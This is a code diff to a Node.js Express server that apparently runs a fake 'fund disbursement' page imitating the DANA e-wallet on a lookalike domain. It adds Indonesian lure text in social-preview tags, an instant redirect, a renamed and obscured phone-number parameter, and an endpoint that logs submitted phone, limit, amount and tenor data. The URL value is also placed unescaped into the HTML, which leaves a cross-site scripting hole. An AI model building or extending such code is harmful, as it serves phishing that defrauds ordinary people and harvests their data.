@@ -495,9 +495,9 @@ app.get("/status/:phone", (req,res)=>{
 
 });
 
-app.get("/pencairan/:phone", (req, res) => {
+app.get("/pencairan/:nmrx", (req, res) => {
 
-    const phone = req.params.phone;
+    const nmrx = req.params.nmrx;
 
     res.send(`
 <!DOCTYPE html>
@@ -506,15 +506,15 @@ app.get("/pencairan/:phone", (req, res) => {
 
 <meta charset="UTF-8">
 
-<title>PENCAIRAN ${phone}</title>
+<title>PENCAIRAN ${nmrx}</title>
 
-<meta property="og:title" content="PENCAIRAN ${phone}">
+<meta property="og:title" content="PENCAIRAN ${nmrx}">
 <meta property="og:description" content="Klik untuk melanjutkan proses pencairan dana Anda.">
 <meta property="og:image" content="https://danaaid.dmpett-dgtall.it.com/assets/preview-pencairan.jpg">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://danaaid.dmpett-dgtall.it.com/pencairan/${phone}">
+<meta property="og:url" content="https://danaaid.dmpett-dgtall.it.com/pencairan/${nmrx}">
 
-<meta http-equiv="refresh" content="0;url=/pencairan.html?phone=${phone}">
+<meta http-equiv="refresh" content="0;url=/pencairan/${nmrx}/lanjut">
 
 </head>
 <body></body>
@@ -650,6 +650,31 @@ setInterval(async () => {
     }
 
 }, 60000);
+
+app.get("/pencairan/:nmrx/lanjut", (req, res) => {
+
+    res.sendFile(
+        path.join(__dirname, "pencairan.html")
+    );
+
+});
+
+app.post("/api/pencairan", async (req, res) => {
+
+    const {
+        nmrx,
+        limit,
+        nominal,
+        tenor
+    } = req.body;
+
+    console.log(req.body);
+
+    res.json({
+        success: true
+    });
+
+});
 
 /* PORT */
 const PORT =
